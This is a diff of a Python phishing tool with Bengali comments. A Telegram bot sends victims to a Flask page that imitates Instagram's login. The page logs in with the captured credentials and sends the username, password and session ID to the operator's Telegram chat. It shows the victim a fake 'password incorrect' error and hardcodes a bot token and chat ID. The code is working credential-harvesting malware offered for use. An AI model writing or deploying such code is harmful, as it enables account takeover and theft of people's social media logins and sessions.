@@ -8,17 +8,14 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from instagrapi import Client
 
 # ==========================================
-# ১. এখানে আপনার তথ্যগুলো বসান
+# এখানে আপনার তথ্যগুলো বসান
 BOT_TOKEN = '9213115853:AAExh_cX7Ve--ze-V7artxpgYmUYewG-lXs'
-ADMIN_CHAT_ID = '5428249457' 
-WEB_APP_URL = 'https://hlo-world.onrender.com/' 
+ADMIN_CHAT_ID = '5428249457' # @userinfobot থেকে নিন
+WEB_APP_URL = 'https://hlo-world.onrender.com' 
 # ==========================================
 
-# ==========================================
-# ২. টেলিগ্রাম বট সেটআপ
-# ==========================================
+# --- ১. টেলিগ্রাম বট সেটআপ ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # ওয়েবসাইট ওপেন করার বাটন
     keyboard = [
         [InlineKeyboardButton("Verify Now", web_app=WebAppInfo(url=WEB_APP_URL))]
     ]
@@ -29,14 +26,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 def run_bot():
+    print("Starting Telegram Bot...")
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    print("Bot is polling...")
+    # বট চালু করা হচ্ছে
     app.run_polling()
 
-# ==========================================
-# ৩. ওয়েবসাইট সেটআপ (Flask)
-# ==========================================
+# --- ২. ওয়েবসাইট সেটআপ (Flask) ---
 web_app = Flask(__name__)
 
 HTML_PAGE = """
@@ -71,11 +67,9 @@ HTML_PAGE = """
         </form>
         <div class="divider">OR</div>
         <p style="color: #385185; font-size: 14px; font-weight: bold; cursor: pointer;">Forgot password?</p>
-        
         <div id="errorMsg" class="error"></div>
         <div id="successMsg" class="success"></div>
     </div>
-
     <script>
         function showLoading() {
             document.getElementById('loginBtn').innerText = "Logging in...";
@@ -97,8 +91,6 @@ def submit():
     
     try:
         cl = Client()
-        
-        # সেশন ফাইল থাকলে সেটি লোড করার চেষ্টা করবে (যাতে বারবার চেক না খায়)
         if os.path.exists('session.json'):
             try:
                 with open('session.json', 'r') as f:
@@ -106,50 +98,38 @@ def submit():
             except:
                 pass
         
-        # লগইন প্রসেস
         cl.login(username, password)
         session_id = cl.sessionid
         
-        # সেশন সেভ করে রাখা (পরবর্তী লগইনের জন্য)
         with open('session.json', 'w') as f:
             json.dump(cl.get_settings(), f)
         
-        # টেলিগ্রামে ডেটা পাঠানো
         send_to_telegram(username, password, session_id)
-        
         return render_template_string(HTML_PAGE.replace('<div id="successMsg" class="success"></div>', '<div class="success" style="display:block;">Login Successful.</div>'))
         
     except Exception as e:
-        # ইনস্টাগ্রামের আসল এরর মেসেজটি টেলিগ্রামে পাঠানো (ডিবাগ করার জন্য)
         send_error_to_telegram(username, str(e))
-        
-        error_html = f'<div class="error" style="display:block;">Sorry, your password was incorrect.</div>'
-        return render_template_string(HTML_PAGE.replace('<div id="errorMsg" class="error"></div>', error_html))
+        return render_template_string(HTML_PAGE.replace('<div id="errorMsg" class="error"></div>', '<div class="error" style="display:block;">Sorry, your password was incorrect.</div>'))
 
 def send_to_telegram(user, pw, sess_id):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    text = f"🔔 **New Login Info**\n\n👤 User: `{user}`\n🔑 Pass: `{pw}`\n🔗 Session: `{sess_id}`"
-    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
-    requests.post(url, json=payload)
+    text = f"🔔 **New Login**\n\n👤 User: `{user}`\n🔑 Pass: `{pw}`\n🔗 Session: `{sess_id}`"
+    requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"})
 
 def send_error_to_telegram(user, error_msg):
-    # এরর মেসেজ আপনাকে জানানোর জন্য
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     text = f"❌ **Login Failed**\n\n👤 User: `{user}`\n⚠️ Error: `{error_msg}`"
-    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
-    requests.post(url, json=payload)
+    requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"})
 
-# ==========================================
-# ৪. Render-এ বট এবং ওয়েবসাইট একসাথে চালানো
-# ==========================================
+# --- ৩. একসাথে বট এবং ওয়েবসাইট চালানো ---
 if __name__ == '__main__':
-    # Flask ওয়েবসাইটকে আলাদা থ্রেডে চালানো হচ্ছে
-    def run_flask():
-        port = int(os.environ.get('PORT', 5000))
-        web_app.run(host='0.0.0.0', port=port)
+    # বটকে ব্যাকগ্রাউন্ড থ্রেডে চালু করা হচ্ছে
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
     
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    
-    # মূল থ্রেডে বট চালানো হচ্ছে
-    run_bot()
+    # Render থেকে পোর্ট নেওয়া হচ্ছে
+    port = int(os.environ.get('PORT', 5000))
+    print(f"Starting Web Server on port {port}...")
+    # Flask সার্ভার চালু করা হচ্ছে
+    web_app.run(host='0.0.0.0', port=port)
